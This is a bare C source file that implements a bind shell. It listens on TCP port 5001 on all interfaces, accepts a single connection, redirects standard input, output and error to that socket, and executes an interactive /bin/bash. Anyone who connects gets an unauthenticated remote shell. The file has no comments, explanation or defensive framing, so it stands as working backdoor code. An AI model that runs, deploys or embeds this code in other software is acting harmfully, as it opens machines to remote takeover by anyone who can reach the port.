#include <stdio.h>
#include <unistd.h>
#include <stdlib.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <string.h>
#include <sys/types.h>
#include <sys/mman.h>



int main()
{
	struct sockaddr_in serv_addr;
	int connfd;
	char *bin = "/bin/bash";
	char *argv[3] = { bin, "-i", 0 };
	int enable = 1;

	int listenfd = socket(AF_INET, SOCK_STREAM, 0);
	if (listenfd < 0) {
		printf("socket() failed\n");
		return -1;
	}
	if (setsockopt(listenfd, SOL_SOCKET, SO_REUSEADDR, &enable, sizeof(int)) < 0)
	{
		printf("setsockopt(SO_REUSEADDR) failed");
		return -1;
	}

	memset(&serv_addr, '0', sizeof(serv_addr));

	serv_addr.sin_family = AF_INET;
	serv_addr.sin_addr.s_addr = htonl(INADDR_ANY);
	serv_addr.sin_port = htons(5001);

	if (bind(listenfd, (struct sockaddr*)&serv_addr, sizeof(serv_addr)) < 0) {
		printf("bind() failed\n");
		return -1;
	}

	
	if (listen(listenfd, 10) < 0) {
		printf("listen() failed\n");
		return -1;
	}
	
	connfd = accept(listenfd, (struct sockaddr*)NULL, NULL); 
	if (connfd < 0) {
		printf("accept() failed\n");
		return -1;
	}

	for (int i = 0; i < 3; i++) {
		dup2(connfd, i);
	}
	if (execve(bin, argv, NULL) < 0) {
		printf("execve failed\n");
		exit(-1);
	}

	return -1;
}
